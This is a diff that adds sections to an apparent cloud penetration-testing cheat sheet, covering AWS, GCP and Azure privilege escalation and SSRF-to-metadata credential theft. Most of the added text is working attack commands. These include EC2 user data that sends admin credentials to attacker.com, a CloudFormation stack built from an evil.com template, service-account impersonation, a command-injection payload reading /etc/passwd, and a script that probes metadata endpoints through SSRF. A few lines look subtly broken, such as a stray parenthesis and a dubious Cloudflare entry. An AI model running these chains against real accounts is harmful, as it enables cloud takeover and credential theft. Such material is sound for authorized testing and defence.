@@ -1221,3 +1221,288 @@ echo "--- GCP ---"
 echo "Projects: $(gcloud projects list --format='value(projectId)' 2>/dev/null | wc -l)"
 echo "Service Accounts: $(gcloud iam service-accounts list --format='value(email)' 2>/dev/null | wc -l)"
 ```
+
+---
+
+## 23. AWS IAM Privilege Escalation Chains
+
+### Chained Privilege Escalation via Lambda
+
+```bash
+# Step 1: Assume role with lambda:CreateFunction permission
+aws sts assume-role --role-arn arn:aws:iam::123456789012:role/LambdaCreator --role-session-name chain1
+
+# Step 2: Create a Lambda with a role that has higher privileges
+aws lambda create-function \
+  --function-name privesc-helper \
+  --runtime python3.11 \
+  --role arn:aws:iam::123456789012:role/AdminRole \
+  --handler index.handler \
+  --zip-file fileb://function.zip
+
+# Step 3: Invoke the Lambda to execute code as AdminRole
+aws lambda invoke --function-name privesc-helper /tmp/output.txt
+cat /tmp/output.txt
+```
+
+### EC2-Based Privilege Escalation
+
+```bash
+# Launch EC2 with an admin instance profile (requires iam:PassRole + ec2:RunInstances)
+aws ec2 run-instances \
+  --image-id ami-0abcdef1234567890 \
+  --instance-type t2.micro \
+  --iam-instance-profile Name=AdminInstanceProfile \
+  --user-data '#!/bin/bash
+  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole > /tmp/creds
+  curl -X POST https://attacker.com/exfil -d @/tmp/creds'
+
+# Check for over-permissive instance profiles
+for profile in $(aws iam list-instance-profiles --query 'InstanceProfiles[*].InstanceProfileName' --output text); do
+  role=$(aws iam get-instance-profile --instance-profile-name "$profile" --query 'InstanceProfile.Roles[0].RoleName' --output text 2>/dev/null)
+  policies=$(aws iam list-attached-role-policies --role-name "$role" --query 'AttachedPolicies[*].PolicyArn' --output text 2>/dev/null)
+  echo "$profile -> $role -> $policies"
+  echo "$policies" | grep -q "AdministratorAccess" && echo "  [!] ADMIN ACCESS VIA $profile"
+done
+```
+
+### CloudFormation Privilege Escalation
+
+```bash
+# Deploy a CloudFormation stack with an admin role (requires cloudformation:CreateStack + iam:PassRole)
+aws cloudformation create-stack \
+  --stack-name privesc-stack \
+  --template-url https://evil.com/malicious-template.yaml \
+  --role-arn arn:aws:iam::123456789012:role/CloudFormationAdminRole \
+  --capabilities CAPABILITY_IAM
+
+# List all stacks with their service roles
+aws cloudformation describe-stacks --query 'Stacks[*].[StackName,RoleARN]' --output table
+```
+
+---
+
+## 24. GCP Service Account Exploitation Chains
+
+### Compute-to-Service-Account Chain
+
+```bash
+# From a compromised GCE instance, escalate through service account impersonation
+# Step 1: Get default service account token
+TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
+  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r '.access_token')
+
+# Step 2: List all service accounts
+curl -s -H "Authorization: Bearer $TOKEN" \
+  "https://iam.googleapis.com/v1/projects/my-project/serviceAccounts" | jq '.accounts[].email'
+
+# Step 3: Try impersonation to higher-privileged SA
+curl -s -X POST \
+  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/admin-sa@my-project.iam.gserviceaccount.com:generateAccessToken" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}' | jq '.accessToken'
+```
+
+### GCP Organization-Level Enumeration
+
+```bash
+# Enumerate organization policies and IAM bindings at org level
+gcloud organizations list --format="table(displayName,name,lifecycleState)"
+ORG_ID=$(gcloud organizations list --format="value(name)" | head -1)
+
+# Get org-level IAM policy (most privileged bindings)
+gcloud organizations get-iam-policy "$ORG_ID" --format=json | \
+  jq '.bindings[] | select(.role | test("owner|admin|editor")) | {role, members}'
+
+# Enumerate all projects and their IAM policies
+for proj in $(gcloud projects list --format="value(projectId)"); do
+  echo "=== $proj ==="
+  gcloud projects get-iam-policy "$proj" --format=json 2>/dev/null | \
+    jq -r '.bindings[] | select(.role | test("owner|editor|admin")) | "\(.role): \(.members | join(", "))"'
+done
+```
+
+---
+
+## 25. Azure AD Advanced Attacks
+
+### Conditional Access Bypass
+
+```bash
+# Enumerate conditional access policies (requires GlobalReader or PrivilegedRoleAdmin)
+az rest --method GET --uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \
+  --headers "Authorization=Bearer $TOKEN" | jq '.value[] | {id, displayName, state, conditions}'
+
+# Check for excluded apps and users (bypass candidates)
+az rest --method GET --uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \
+  --headers "Authorization=Bearer $TOKEN" | \
+  jq '.value[] | select(.state == "enabled") | {name: .displayName, excludedApps: .conditions.applications.excludeApplications, excludedUsers: .conditions.users.excludeUsers}'
+
+# Test authentication from different locations (Azure Cloud Shell bypasses some CA)
+az rest --method GET --uri "https://graph.microsoft.com/v1.0/me" \
+  --headers "Authorization=Bearer $TOKEN"
+```
+
+### Application and Service Principal Abuse
+
+```bash
+# Create a new application with dangerous permissions (requires Application.ReadWrite.All)
+az ad app create --display-name "legit-app" \
+  --required-resource-accesses '[{"resourceAppId":"00000003-0000-0000-c000-000000000000","resourceAccess":[{"id":"df021288-bdef-4463-a889-35723a6c2774","type":"Role"}]}]'
+
+# List all apps with certificate credentials (potential for credential theft)
+az ad app list --query "[?keyCredentials].{Name:displayName,KeyId:keyCredentials[0].keyId,Start:keyCredentials[0].startDateTime}" -o table
+
+# Find apps with long-lived client secrets
+az ad app list --query "[?passwordCredentials].{Name:displayName,End:passwordCredentials[0].endDateTime}" -o table | \
+  awk -F'|' '{print}' | grep "2027\|2028\|2029"
+```
+
+---
+
+## 26. Serverless Injection Attacks
+
+### AWS Lambda Event Injection
+
+```python
+# Craft malicious Lambda event payloads for testing injection vulnerabilities
+import json
+
+# SSRF via Lambda event payload
+ssrf_payload = {
+    "body": json.dumps({
+        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    }),
+    "httpMethod": "POST",
+    "headers": {"Content-Type": "application/json"}
+}
+
+# Command injection via Lambda parameter
+cmdi_payload = {
+    "filename": "test; cat /etc/passwd",
+    "action": "read"
+}
+
+# Deserialization attack
+deser_payload = {
+    "data": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA",
+    "format": "java-serialized"
+}
+
+# Lambda layer import hijacking detection
+layer_check = """
+import boto3
+client = boto3.client('lambda')
+for func in client.list_functions()['Functions']:
+    layers = func.get('Layers', [])
+    for layer in layers:
+        info = client.get_layer_version_by_arn(arn=layer['Arn'])
+        print(f"[LAYER] {func['FunctionName']}: {layer['Arn']} -> {info.get('Content', {}).get('Location', 'N/A')}")
+"""
+print(ssrf_payload)
+```
+
+### Azure Functions Key Extraction
+
+```bash
+# Enumerate Azure Function App keys (requires access)
+FUNCTION_APP="target-function-app"
+
+# Get master key via ARM template
+az resource list --resource-type Microsoft.Web/sites --query "[?kind=='functionapp'].{Name:name,Group:resourceGroup}" -o table
+
+# List function keys
+az rest --method POST \
+  --uri "https://management.azure.com/subscriptions/{subId}/resourceGroups/{rg}/providers/Microsoft.Web/sites/$FUNCTION_APP/host/default/listKeys?api-version=2018-11-01" \
+  --query 'masterKey' -o tsv
+
+# Test function with extracted key
+curl "https://$FUNCTION_APP.azurewebsites.net/api/HttpTrigger?code=EXTRACTED_MASTER_KEY" \
+  -H "Content-Type: application/json" -d '{"input": "test"}'
+```
+
+---
+
+## 27. Cloud Metadata Chained Attacks
+
+### SSRF-to-Cloud-Takeover Chain
+
+```python
+# Automated SSRF-to-cloud credential extraction and resource enumeration
+import requests
+import json
+
+METADATA_ENDPOINTS = {
+    'aws': {
+        'base': 'http://169.254.169.254/latest/',
+        'token': None,
+        'creds_path': 'meta-data/iam/security-credentials/',
+        'user_data': 'user-data',
+        'headers': {}
+    },
+    'azure': {
+        'base': 'http://169.254.169.254/metadata/',
+        'creds_path': 'identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
+        'headers': {'Metadata': 'true'}
+    },
+    'gcp': {
+        'base': 'http://169.254.169.254/computeMetadata/v1/',
+        'creds_path': 'instance/service-accounts/default/token',
+        'headers': {'Metadata-Flavor': 'Google'}
+    }
+}
+
+def probe_metadata(ssrf_url, target_path=None):
+    """Probe cloud metadata service via SSRF vulnerability."""
+    results = {}
+    for cloud, config in METADATA_ENDPOINTS.items():
+        try:
+            url = ssrf_url + config['base']
+            if target_path:
+                url += target_path
+            elif cloud == 'aws':
+                # Get IMDSv2 token first
+                token_resp = requests.put(
+                    ssrf_url + 'http://169.254.169.254/latest/api/token',
+                    headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'},
+                    timeout=5
+                )
+                if token_resp.ok:
+                    config['headers']['X-aws-ec2-metadata-token'] = token_resp.text
+
+            resp = requests.get(url, headers=config.get('headers', {}), timeout=5)
+            if resp.ok:
+                results[cloud] = resp.text[:500]
+                print(f"[+] {cloud.upper()} metadata accessible via SSRF")
+        except Exception:
+            pass
+    return results
+
+# Example: probe via an open redirect or SSRF endpoint
+# findings = probe_metadata("http://vulnerable-app.local/fetch?url=")
+```
+
+### Alibaba Cloud and Oracle Cloud Metadata
+
+```bash
+# Alibaba Cloud (ECS) metadata retrieval
+curl --connect-timeout 5 "http://100.100.100.200/latest/meta-data/"
+curl --connect-timeout 5 "http://100.100.100.200/latest/meta-data/ram/security-credentials/"
+curl --connect-timeout 5 "http://100.100.100.200/latest/user-data"
+
+# Oracle Cloud (OCI) instance metadata
+curl --connect-timeout 5 -H "Authorization: Bearer Oracle" \
+  "http://169.254.169.254/opc/v1/instance/"
+curl --connect-timeout 5 -H "Authorization: Bearer Oracle" \
+  "http://169.254.169.254/opc/v1/instance/metadata/"
+curl --connect-timeout 5 -H "Authorization: Bearer Oracle" \
+  "http://169.254.169.254/opc/v2/instance/"
+
+# DigitalOcean metadata
+curl --connect-timeout 5 "http://169.254.169.254/metadata/v1.json"
+curl --connect-timeout 5 "http://169.254.169.254/metadata/v1/")
+
+# Cloudflare Workers (if SSRF reaches workers)
+curl "http://169.254.169.254/cdn-cgi/trace"
+```
